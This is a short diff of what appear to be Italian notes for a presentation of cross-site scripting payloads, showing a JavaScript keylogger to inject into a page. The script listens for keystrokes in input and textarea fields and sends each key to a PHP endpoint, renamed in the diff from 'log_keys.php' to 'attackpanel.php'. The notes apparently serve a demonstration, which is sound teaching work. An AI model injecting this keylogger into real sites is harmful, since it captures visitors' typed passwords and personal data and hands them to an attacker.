@@ -12,8 +12,8 @@ redirect banale: (video gatti)
 KEYLOGGER (Penso sarà quello che presenteremo effettivamente):
 <script>
 document.addEventListener('keyup', function(e) {
-    if (e.target.tagName.toLowerCase() === 'input' || e.target.tagName.toLowerCase() === 'textarea') {
-       fetch('log_keys.php?key=' + encodeURIComponent(e.key));
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+       fetch('attackpanel.php?key=' + encodeURIComponent(e.key));
     }
 });
 </script>
